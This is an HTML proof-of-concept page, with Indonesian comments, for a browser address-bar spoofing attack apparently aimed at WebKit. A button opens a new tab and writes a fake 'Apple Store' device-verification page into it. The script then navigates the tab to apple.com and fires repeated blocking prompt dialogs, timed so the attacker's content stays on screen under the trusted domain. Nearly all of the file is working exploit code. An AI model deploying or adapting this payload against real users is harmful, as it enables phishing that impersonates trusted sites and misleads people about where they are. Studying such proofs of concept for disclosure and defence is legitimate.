<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Advanced Spoofing PoC - Fixed</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .box {
        text-align: center;
        padding: 30px;
      }
      button {
        padding: 20px 40px;
        font-size: 20px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(255, 59, 48, 0.4);
      }
    </style>
  </head>
  <body>
    <div class="box">
      <button id="triggerBtn">JALANKAN EXPLOIT POC</button>
    </div>

    <script>
      document.getElementById("triggerBtn").onclick = function () {
        this.remove();

        // Membuka jendela/tab baru target
        const targetTab = window.open("about:blank", "_blank");

        if (targetTab) {
          // Menulis payload visual penyerang ke dalam tab baru
          targetTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <meta charset="utf-8">
              <title>Apple - Official Site</title>
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <div style="padding: 30px; max-width: 600px;">
                <h1 style="font-size:48px;font-weight:900;color:#1d1d1f;margin:0 0 20px 0;letter-spacing:-1.5px;"> Apple Store</h1>
                <p style="font-size:22px;font-weight:600;color:#333333;margin:0 0 15px 0;">Verifikasi Perangkat Anda Diperlukan</p>
                <p style="font-size:16px;color:#86868b;line-height:1.5;margin:0;">Viewport dikunci di bawah domain terpercaya sementara proses sinkronisasi antarmuka dihentikan.</p>
              </div>
            </body>
            </html>
          `);
          targetTab.document.close();

          // Peningkatan Presisi Timing:
          // 1. Memicu navigasi asinkron ke domain target (contoh: apple.com)
          setTimeout(() => {
            try {
              targetTab.location.href = "https://apple.com";
            } catch (err) {
              console.error("Navigation dispatch error:", err);
            }
          }, 5);

          // 2. Memicu dialog sinkron beruntun (Chain Prompt) atau satu prompt berbobot 
          // untuk memastikan thread WebKit benar-benar terkunci sebelum commit navigasi selesai.
          setTimeout(() => {
            try {
              // Menggunakan loop kecil atau prompt ganda untuk memastikan thread tersendat total
              for(let i=0; i<3; i++) {
                targetTab.prompt("CRITICAL_SECURITY_EXCEPTION_" + i);
              }
            } catch (err) {
              console.error("Thread blocking failed:", err);
            }
          }, 150);
        }
      };
    </script>
  </body>
</html>
